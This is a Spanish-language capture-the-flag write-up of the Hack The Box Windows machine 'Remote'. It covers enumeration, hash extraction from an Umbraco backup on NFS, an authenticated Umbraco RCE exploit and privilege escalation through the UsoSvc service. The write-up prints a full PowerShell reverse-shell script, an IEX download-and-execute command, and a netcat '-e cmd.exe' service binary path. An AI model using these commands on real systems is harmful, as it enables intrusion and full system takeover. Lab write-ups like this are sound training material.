---
layout: post
title: Remote HTB WriteUp
description: Easy Windows machine from HTB
---

# REMOTE
![banner](https://github.com/jagelit0/jagelit0.github.io/blob/master/_posts/htb-remote/remotebanner.png?raw=true)
---
# Recon 

## Nmap
```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m25s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T21:28:21
|_  start_date: N/A
```


A simple vista, me llama la atención, el puerto 21, ya que nos permite el logueo anónimo, también tenemos una página web y SMB, además podemos ver que bajo el puerto 111 está corriendo NFS.


## Enumeración FTP - port 21 (TCP)
 Tras ver que el puerto 21 está abierto y que nos permite el logueo anónimo, probamos a entrar y echar un vistazo a ver si hay algo que nos llame la atención en él, pero no hay nada.


## Enumeración Web - port 80 (TCP)
 Al acceder vemos una "tienda" que ofrece productos de _Umbraco_ . Tras navegar por ella y buscar algún parámetro extraño y revisar el código fuente, no observo nada que me llame la atención. Busco en google "Umbraco" y aparece que es un CMS. Tras haber estado cotilleando un rato por la web y no haber encontrado nada, procedo a enumerar la web con herramientas básicas.
![web](https://github.com/jagelit0/jagelit0.github.io/blob/master/_posts/htb-remote/simple-web.png?raw=true)


### Nikto
```bash
jagelito ~$ nikto -h http://remote.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.180
+ Target Hostname:    remote.htb
+ Target Port:        80
+ Start Time:         2021-07-12 01:07:18 (GMT2)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server banner has changed from '' to 'Microsoft-IIS/10.0' which may suggest a WAF, load balancer or proxy is in place
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3092: /intranet/: This might be interesting...
+ /umbraco/ping.aspx: Umbraco ping page found
+ 7785 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-07-12 01:14:14 (GMT2) (416 seconds)
---------------------------------------------------------------------------
```


Nikto nos avisa que existe un directorio llamado _Umbraco_ , al acceder a él vemos que realmente el CMS que se está utilizando es este.
![umbraco](https://github.com/jagelit0/jagelit0.github.io/blob/master/_posts/htb-remote/umbraco_portal.png?raw=true)


### Dirsearch
```bash
jagelito ~$ dirsearch -u http://remote.htb -x400,404

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Target: http://remote.htb/

[11:31:44] Starting: 
[11:31:45] 403 -  312B  - /%2e%2e//google.com
[11:31:45] 200 -    2KB - /.aspx
[11:31:55] 302 -  126B  - /INSTALL  ->  /umbraco/
[11:31:55] 302 -  126B  - /Install  ->  /umbraco/
[11:31:58] 403 -    2KB - /Trace.axd
[11:32:00] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[11:32:02] 200 -    2KB - /about-us
[11:32:23] 200 -    2KB - /blog
[11:32:23] 200 -    2KB - /blog/
[11:32:29] 200 -    3KB - /contact.aspx
[11:32:29] 200 -    3KB - /contact
[11:32:32] 200 -    2KB - /default.aspx
[11:32:40] 200 -    2KB - /home
[11:32:40] 200 -    2KB - /home.aspx
[11:32:42] 302 -  126B  - /install/  ->  /umbraco/
[11:32:42] 302 -  126B  - /install  ->  /umbraco/
[11:32:42] 200 -    1KB - /intranet
[11:32:48] 500 -    3KB - /master/
[11:32:54] 200 -    2KB - /people
[11:33:04] 500 -    3KB - /product
[11:33:04] 200 -    2KB - /products
[11:33:04] 200 -    2KB - /products.aspx
```
```bash
jagelito ~$ dirsearch -u http://10.10.10.180/umbraco -x400,404,403

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Target: http://10.10.10.180/umbraco/

[11:36:22] Starting: 
[11:36:23] 301 -  154B  - /umbraco/js  ->  http://10.10.10.180/umbraco/js/
[11:36:26] 301 -  159B  - /umbraco/INSTALL  ->  http://10.10.10.180/umbraco/INSTALL/
[11:36:26] 301 -  159B  - /umbraco/Install  ->  http://10.10.10.180/umbraco/Install/
[11:36:26] 301 -  158B  - /umbraco/Search  ->  http://10.10.10.180/umbraco/Search/
[11:36:29] 301 -  159B  - /umbraco/actions  ->  http://10.10.10.180/umbraco/actions/
[11:36:34] 200 -    2KB - /umbraco/application
[11:36:34] 200 -    3KB - /umbraco/application/logs/
[11:36:34] 200 -    3KB - /umbraco/application/
[11:36:34] 200 -    3KB - /umbraco/application/cache/
[11:36:34] 301 -  158B  - /umbraco/assets  ->  http://10.10.10.180/umbraco/assets/
[11:36:37] 301 -  158B  - /umbraco/config  ->  http://10.10.10.180/umbraco/config/
[11:36:38] 301 -  161B  - /umbraco/dashboard  ->  http://10.10.10.180/umbraco/dashboard/
[11:36:38] 200 -    4KB - /umbraco/default
[11:36:38] 301 -  161B  - /umbraco/developer  ->  http://10.10.10.180/umbraco/developer/
[11:36:41] 301 -  159B  - /umbraco/install  ->  http://10.10.10.180/umbraco/install/
[11:36:42] 301 -  155B  - /umbraco/lib  ->  http://10.10.10.180/umbraco/lib/
[11:36:42] 301 -  163B  - /umbraco/lib/tinymce  ->  http://10.10.10.180/umbraco/lib/tinymce/
[11:36:43] 200 -  657B  - /umbraco/logout.aspx
[11:36:43] 301 -  159B  - /umbraco/members  ->  http://10.10.10.180/umbraco/members/
[11:36:46] 301 -  159B  - /umbraco/plugins  ->  http://10.10.10.180/umbraco/plugins/
[11:36:48] 301 -  158B  - /umbraco/search  ->  http://10.10.10.180/umbraco/search/
[11:36:48] 301 -  160B  - /umbraco/settings  ->  http://10.10.10.180/umbraco/settings/
[11:36:52] 301 -  157B  - /umbraco/views  ->  http://10.10.10.180/umbraco/views/
```


Tras estar un rato "cotilleando" y fuzeando la web, no encuentro nada interesante, ni credenciales que se hayan podido dejar sin querer en algún archivo. Pruebo credenciales por defecto en la página de logueo de _Umbraco_, pero nada funciona. 


## Enumeración SMB - port 139,445 (TCP)
Al ver estos puertos abiertos pruebo a enumerar algún recurso que se esté compartiendo bajo una null session, pero no nos deja acceder
```bash
jagelito ~$ crackmapexec smb --shares 10.10.10.180 -u '' -p ''
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [-] remote\: STATUS_ACCESS_DENIED 
SMB         10.10.10.180    445    REMOTE           [-] Error enumerating shares: Error occurs while reading from remote(104)
```


## Enumeración NFS - port 111 (TCP)
Al ver que bajo el puerto 111 está corriendo NFS (Network File System), pruebo a ver si aquí hay algún recurso compartido.
```bash
jagelito ~$ showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)

jagelito ~$ sudo mount -t nfs 10.10.10.180:/site_backups content/nfs/backup_mnt/ -nolock

jagelito ~$ ls -la content/nfs/backup_mnt/
total 123
drwx------ 2 nobody   4294967294  4096 Feb 23  2020 .
drwxr-xr-x 3 jagelito jagelito    4096 Jul  9 23:47 ..
drwx------ 2 nobody   4294967294    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Data
drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody   4294967294    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody   4294967294 49152 Feb 20  2020 bin
drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Config
drwx------ 2 nobody   4294967294    64 Feb 20  2020 css
-rwx------ 1 nobody   4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody   4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Media
drwx------ 2 nobody   4294967294    64 Feb 20  2020 scripts
drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Views
-rwx------ 1 nobody   4294967294 28539 Feb 20  2020 Web.config
```
Por suerte, se está compartiendo un backup del sitio Web, por lo que tras googlear un poco dónde se quedan guardadas las credenciales de _Umbraco_, encontramos el archivo _Umbraco.sdf_ en el directorio _App\_Data_ . Al inspeccionar este archivo nos muestra que contiene "_data_". Se trata de un archivo que contiene la base de datos. Al hacerle un simple _cat_ se muestran carácteres extraños. Se podría usar algún programa para tratar de visualizar el contenido, pero antes de estar utilizando programas, intento ir de más simple a más complejo, así que le hago un _strings_ para comprobar qué se puede sacar en claro de este archivo.
```bash
jagelito ~$ file Umbraco.sdf 
Umbraco.sdf: data

jagelito ~$ strings Umbraco.sdf | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj
```
Encontramos que aparecen dos usuarios con lo que parecen dos contraseñas hasheadas.

| Usuario | Hash | Contraseña |
| --- | --- | --- |
| admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa| baconandcheese |
| smith@htb.local | ljxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= | N/A |

---


# Explotación
## Umbraco CMS
Una vez que tenemos un usuario y una contraseña en texto claro, pruebo a acceder a Umbraco y conseguimos loguearnos como administrator. Conseguimos saber qué versión está corriendo.
![admin](https://github.com/jagelit0/jagelit0.github.io/blob/master/_posts/htb-remote/admin_good.png?raw=true)

Una vez sabemos la versión, buscamos exploits disponibles de manera local para tratar de conseguir RCE. Nos creamos un mirror del exploit y le pasamos los parámetros que nos pide.


```bash
jagelito ~$ searchsploit Umbraco 7.12.4
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                  | aspx/webapps/49488.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------

jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c whoami
iis apppool\defaultapppool
```


Tenemos RCE dentro de la máquina, así que ahora se trata de conseguir una shell en ella. Creamos una reverse shell y abrimos un servidor http con python para poder transferirla a la máquina


Para crear nuestra reverse shell uso este script:


```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/rev.ps1')"

jagelito ~$ sudo python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.180 - - [12/Jul/2021 12:23:26] "GET /rev.ps1 HTTP/1.1" 200 -
```


Una vez transferida la shell a la máquina victima, abrimos el puerto a la escucha con netcat


```bash
jagelito ~$ sudo nc -lvnp 443
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49709
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```
---


# Priv. Esc.
### user.txt
```powershell
PS C:\windows\system32\inetsrv> cd C:\
PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   3:12 PM                .NET v2.0                                                             
d-----        2/19/2020   3:12 PM                .NET v2.0 Classic                                                     
d-----        2/19/2020   3:12 PM                .NET v4.5                                                             
d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                                     
d-----        7/11/2021   7:07 PM                Administrator                                                         
d-----        2/19/2020   3:12 PM                Classic .NET AppPool                                                  
d-r---        2/20/2020   2:42 AM                Public                                                                

PS C:\Users> cd Public

PS C:\Users\Public> dir
    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        2/19/2020   3:03 PM                Documents                                                             
d-r---        9/15/2018   3:19 AM                Downloads                                                             
d-r---        9/15/2018   3:19 AM                Music                                                                 
d-r---        9/15/2018   3:19 AM                Pictures                                                              
d-r---        9/15/2018   3:19 AM                Videos                                                                
-ar---        7/11/2021   7:07 PM             34 user.txt                                                              


PS C:\Users\Public> type user.txt
b200d........................
```


### IIS -> Administrator
Comecemos con una enumeración del sistema con winPEAS. Nos lo transferimos a la máquina y lo ejecutamos.


```powershell
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Users\Public> cd C:/Windows/TEMP

PS C:/Windows/TEMP> iwr -Uri http://10.10.14.12:8000/winPEASx64.exe -Outfile win.exe

PS C:/Windows/TEMP> ./win.exe
...[snip]...

  [+] Modifiable Services                                                                                                                                                                   
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                   
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:                                                                                                                                               
    UsoSvc: AllAccess, Start  
	
...[snip]...
```


Encontramos el servicio _UsoSvc_, siguiendo la guía de [Payload All The Things - Windows Priv. Esc.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md), encontramos que podemos conseguir escalar al usuario Administrator con el CVE-2019-1322. Se trata de una incorrecta administración de permisos en un servicio corriendo bajo NT AUTHORITY/SYSTEM, permitiéndonos reemplazar el binario por netcat y así obtener una reverse como Administrador.


```powershell
PS C:\Windows\TEMP> iwr -Uri http://10.10.14.12:8000/nc64.exe -Outfile nc.exe 

PS C:\Windows\TEMP> sc.exe stop UsoSvc
                                                                                               
SERVICE_NAME: UsoSvc                                                                           
        TYPE               : 30  WIN32                                                         
        STATE              : 3  STOP_PENDING                                                   
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)                
        WIN32_EXIT_CODE    : 0  (0x0)                                                          
        SERVICE_EXIT_CODE  : 0  (0x0)                                                          
        CHECKPOINT         : 0x3                                                               
        WAIT_HINT          : 0x7530 

PS C:\Windows\TEMP> sc.exe config UsoSvc binpath="C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe" 
[SC] ChangeServiceConfig SUCCESS

PS C:\Windows\TEMP> sc.exe qc usosvc
SERVICE_NAME: usosvc                                                                           
        TYPE               : 20  WIN32_SHARE_PROCESS                                           
        START_TYPE         : 2   AUTO_START  (DELAYED)                                         
        ERROR_CONTROL      : 1   NORMAL                                                        
        BINARY_PATH_NAME   : C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe                  
        LOAD_ORDER_GROUP   :                                                                   
        TAG                : 0                                                                 
        DISPLAY_NAME       : Update Orchestrator Service                                       
        DEPENDENCIES       : rpcss                                                             
        SERVICE_START_NAME : LocalSystem  
		
PS C:\Windows\TEMP> sc.exe start UsoSvc 
```

En otra terminal, ponemos un puerto a la escucha.


```powershell
jagelito ~$ sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49870
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
nt authority\system

PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
386bd................
```
 Máquina pwneada.
